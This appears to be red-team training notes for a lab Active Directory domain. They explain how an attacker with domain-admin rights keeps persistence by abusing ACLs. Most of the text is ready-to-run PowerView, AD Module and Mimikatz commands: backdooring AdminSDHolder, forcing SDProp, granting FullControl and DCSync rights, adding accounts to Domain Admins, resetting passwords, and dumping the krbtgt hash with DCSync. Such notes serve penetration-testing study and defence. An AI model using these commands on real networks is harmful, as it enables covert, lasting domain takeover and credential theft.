# Domain Persistence - Using ACLs

- [Domain Persistence - Using ACLs](#domain-persistence---using-acls)
  - [AdminSDHolder](#adminsdholder)
  - [Rights Abuse](#rights-abuse)

---

## AdminSDHolder

**AdminSDHolder** resides in the System container of a domain and used to control the permissions - using an ACL - for certain built-in privileged groups (called **Protected Groups**).

**Security Descriptor Propagator (SDPROP)** runs every hour and compares the ACL of protected groups and members with the ACL of **AdminSDHolder** and any differences are overwritten on the object ACL.

<br/>

| Protected Groups | |
|---|---|
|Account Operators|Enterprise Admins|
|Backup Operatros|Domain Controllers|
|Server Operators|Read-only Domain Controllers|
|Printer Operators|Schema Admins|
|Domain Admins|Administrators|
|Replicator| |

<br/>

Well known abuse of some of the Protected Groups - All of the below can log on locally to DC

|Protected Group | |
|--|--|
| Account Operators| Cannot modify DA/EA/BA groups. Can modify nested group within these groups. |
| Backup Operators | Backup GPO, edit to add SID of controlled account to a privileged group and Restore. |
| Server Operators | Run a command as system (using the disabled Browser service) |
| Print Operators | Copy `ntds.dit` backup, load device drivers. |

<br/>

With DA privileges (Full Control/Write permissions) on the `AdminSDHolder` object, it can be used as a backdoor/persistence mechanism by adding a user with Full Permissions (or other interesting permissions) to the `AdminSDHolder` object.

<br/>

In 60 minutes (when `SDPROP` runs), the user will be added with Full Control to the AC of groups like Domain Admins without actually being a member of it.

<br/>

Add `FullControl` permissions for a user to the `AdminSDHolder` as DA:

- PowerView

```
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=us,dc=techcorp,dc=local' -PrincipalIdentity studentuser1 -Rights All -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -Verbose
```

- AD Module & RACE toolkit (https://github.com/samratashok/RACE)

```
Set-ADACL -DistinguishedName 'DC=us,DC=techcorp,DC=local' -SamAccountName studentuserx -GUIDRight DCSync -Verbose
```

<br/>

Other interesting permissions (ResetPassword, WriteMembers) for a user to the `AdminSDHolder`:

```
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=us,dc=techcorp,dc=local' -PrincipalIdentity studentuser64 -Rights ResetPassword -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -Verbose
```

```
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,dc=us,dc=techcorp,dc=local' -PrincipalIdentity studentuser64 -Rights WriteMembers -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -Verbose
```

<br/>

Run `SDProp` manually using `Invoke-SDPropagator.ps1` from Tools directory:

```
Invoke-SDPropagator -timeoutMinutes 1 -showProgress -Verbose
```

For pre-Server 2008:

```
Invoke-SDPropagator -taskname FixUpInheritance -timeoutMinutes 1 -showProgress -Verbose
```

<br/>

**Check the Domain Admins permission as normal user:**

- PowerView

```
Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_ | Add-Member NoteProperty 'IdentityName' $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "studentuser64"}
```

- AD Module

```
(Get-Acl -Path 'AD:\CN=Domain Admins,CN=Users,DC=us,DC=techcorp,DC=local').Access | ?{$_.IdentityReference -match 'studentuser1'}
```

<br/>

**Abusing Full Control:**

- PowerView

```
Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose
```

- AD Module

```
Add-ADGroupMember -Identity 'Domain Admins' -Members testda
```

<br/>

**Abusing ResetPassword:**

- PowerView

```
Set-DomainUserPassword -Identity testda -AccountPassword (ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
```

- AD Module

```
Set-ADAccountPassword -Identity testda -NewPassword
(ConvertTo-SecureString "Password@123" -AsPlainText -Force) -Verbose
```

<br/>

---

## Rights Abuse

There are even more interesting ACLs which can be abused.

For example, with DA privileges, the **ACL for the domain root** can be
modified to provide useful rights like **FullControl** or the ability to run "**DCSync**".

<br/>

**Add FullControl rights:**

- PowerView

```
Add-DomainObjectAcl -TargetIdentity "dc=us,dc=techcorp,dc=local" -PrincipalIdentity studentuser64 -Rights All -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -Verbose
```

- AD Module + RACE:

```
Set-ADACL -SamAccountName studentuser64 DistinguishedName 'DC=us,DC=techcorp,DC=local' -Right GenericAll -Verbose
```

<br/>

**Add rights for DCSync:**

- PowerView

```
Add-DomainObjectAcl -TargetIdentity "dc=us,dc=techcorp,dc=local" -PrincipalIdentity studentuser64 -Rights DCSync -PrincipalDomain us.techcorp.local -TargetDomain us.techcorp.local -Verbose
```

- AD Module

```
Set-ADACL -SamAccountName studentuser64 DistinguishedName 'DC=us,DC=techcorp,DC=local' -GUIDRight DCSync -Verbose
```

<br/>

**Execute DCSync**

```
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
```

or

```
C:\AD\Tools\SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
```

<br/>

----

